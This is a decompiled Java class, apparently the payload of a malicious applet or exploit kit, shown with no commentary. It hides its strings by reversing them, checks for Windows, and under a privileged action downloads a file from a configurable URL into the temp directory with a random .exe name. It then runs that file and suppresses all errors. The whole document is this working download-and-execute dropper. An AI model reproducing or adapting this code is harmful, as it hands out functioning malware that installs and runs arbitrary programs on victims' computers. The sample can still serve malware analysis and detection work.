// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class DyesyasZ implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final int n2 = 16;
        final byte[] array = new byte[s.length() / n];
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    public Object run() throws Exception {
        if (DyesyasZ.data == null) {
            return null;
        }
        try {
            final String string = new StringBuffer("eman.so").reverse().toString();
            final String string2 = new StringBuffer("swodniW").reverse().toString();
            final String string3 = new StringBuffer("ridpmt.oi.avaj").reverse().toString();
            final String string4 = new StringBuffer("exe.").reverse().toString();
            if (System.getProperty(string).indexOf(string2) >= 0) {
                int int1 = 1;
                if (DyesyasZ.cc != null) {
                    int1 = Integer.parseInt(DyesyasZ.cc);
                }
                final int n = 1024;
                for (int i = 0; i < int1; ++i) {
                    final URL url = new URL(DyesyasZ.data + "1");
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string5 = System.getProperty(string3) + File.separator + Math.random() + string4;
                    final FileOutputStream fileOutputStream = new FileOutputStream(string5);
                    int n2 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n2;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n2 >= n) {
                        Runtime.getRuntime().exec(string5);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public DyesyasZ() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        DyesyasZ.data = null;
        DyesyasZ.cc = null;
    }
}
